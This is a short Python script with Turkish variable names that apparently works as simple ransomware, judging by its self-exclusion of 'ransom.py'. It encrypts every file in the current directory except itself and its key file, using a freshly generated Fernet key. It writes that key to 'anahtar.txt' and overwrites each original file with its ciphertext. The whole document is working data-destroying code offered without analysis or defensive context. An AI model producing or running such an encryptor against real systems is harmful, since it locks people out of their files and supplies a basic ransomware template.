import os
from cryptography.fernet import Fernet

dosyalar = []

for i in os.listdir():
	if (i == "ransom.py") or (i == "ransom2.py"):
		continue
	if os.path.isdir(i):
		continue
	if (i == "anahtar.txt"):
		continue
	dosyalar.append(i)

anahtar = Fernet.generate_key().decode("utf-8")

with open("anahtar.txt","w") as dosya:
	dosya.write(anahtar)

for i in dosyalar:

	with open(i , "rb") as dosya:
		icerik = dosya.read()
	sifreleme = Fernet(anahtar).encrypt(icerik)

	with open(i , "wb") as dosya:
		dosya.write(sifreleme)
